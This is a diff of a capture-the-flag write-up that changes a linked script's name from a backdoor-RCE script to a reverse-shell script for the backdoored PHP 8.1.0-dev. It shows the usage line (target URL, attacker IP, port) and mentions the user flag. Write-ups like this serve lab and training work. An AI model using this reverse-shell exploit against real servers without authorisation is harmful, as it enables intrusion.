@@ -55,11 +55,11 @@ on a browser and inspect the headers. The server is running PHP 8.1.0-dev. There
 allowing attackers to run arbitrary code. 
 ## PHP 8.1.0-dev exploit
 We are going to use 
-[this Python script](https://github.com/prodseanb/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py) to get a shell.
+[this Python script](https://github.com/prodseanb/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py) to get a shell.
 <br/><br/>
 Download the script and execute.
 ```
-Usage: python3 backdoor_php_8.1.0-dev.py [target URL] [Attacker IP] [port]
+Usage: python3 revshell_php_8.1.0-dev.py [target URL] [Attacker IP] [port]
 ```
 The first flag (user.txt) is under `/home/james`.
 ## Privilege escalation/root flag
